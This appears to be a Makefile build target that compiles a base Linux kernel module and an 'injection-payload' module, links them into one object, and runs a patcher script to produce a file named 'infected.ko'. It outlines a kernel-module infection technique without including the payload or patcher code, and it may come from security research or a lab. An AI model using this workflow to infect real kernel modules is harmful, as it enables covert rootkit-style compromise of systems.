build:
	make -C ./base/
	make -C ./injection/
	cp ./base/src/test-mod.ko /workdir/artifacts/test-mod.ko
	find ./injection/
	cp ./injection/src/injection-payload.ko /workdir/artifacts/injection-payload.ko
	ld -r /workdir/artifacts/test-mod.ko \
		/workdir/artifacts/injection-payload.ko \
		-o /workdir/artifacts/together.ko
	python3 ./patcher.py /workdir/artifacts/together.ko /workdir/artifacts/infected.ko
